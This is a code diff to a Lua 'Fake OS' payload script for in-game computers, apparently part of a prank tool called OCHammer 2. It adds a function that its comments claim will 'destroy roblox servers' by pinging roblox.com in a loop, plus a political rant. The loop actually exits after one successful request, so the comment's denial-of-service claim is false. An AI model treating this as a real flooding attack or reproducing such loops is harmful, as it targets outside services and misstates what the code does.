@@ -21,6 +21,19 @@ end)
 
 local resX,resY = gp.maxResolution()
 
+function ROBLOX()
+  -- destroy roblox servers using internet, ping roblox.com every 0.1 seconds
+  while true do
+    local ping = inet.request("roblox.com")
+    if ping then
+      log("Roblox moderation sucks")
+      break
+    end
+    computer.pullSignal(0.1)
+  end
+end
+
+
 -- OChammer2 Fake OS.lua
 
 -- New payload for OCHammer 2, that activates, if the user is in Latvia, by testing russian websites to see if they are blocked by the government. (which I rate a solid 0 out of 10 because yes)
@@ -160,6 +173,9 @@ function lol()
 
     displayTable(ok)
     
+    -- actually delete roblox off of the internet
+    ROBLOX()
+
     while true do
       computer.pullSignal(1)
     end
@@ -434,6 +450,9 @@ local function UIRequire(module)
   log("UI Loading module " .. module)
   return require(module)
 end
+
+-- WARNING: Roblox moderation sucks (bans people for supporting ukraine and hating russia)
+-- David Baszucki (CEO of roblox), if you're reading this, fix your moderation or check function ROBLOX on line 24 to 34
 
 -- Because you looked at the source code too much, here's something:
 
